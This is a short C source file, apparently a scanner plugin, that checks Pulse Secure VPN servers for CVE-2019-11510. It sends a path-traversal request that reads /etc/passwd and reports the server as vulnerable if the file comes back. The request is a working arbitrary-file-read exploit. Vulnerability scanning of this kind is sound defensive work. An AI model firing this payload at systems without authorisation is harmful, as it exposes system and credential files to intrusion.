/* http-vuln-cve2019-11510-4 - Pulse Secure arbitrary file read probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd", NULL, NULL, NULL, NULL,
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "http-vuln-cve2019-11510-4: no HTTP response");
        return 0;
    }
    if (ar_contains_ci(resp, "root:")) {
        ar_out(ctx, "VULNERABLE: /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd [%d] (CVE-2019-11510)", ar_http_status(resp));
    } else {
        ar_out(ctx, "not vulnerable: CVE-2019-11510 (/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd [%d])", ar_http_status(resp));
    }
    return 0;
}
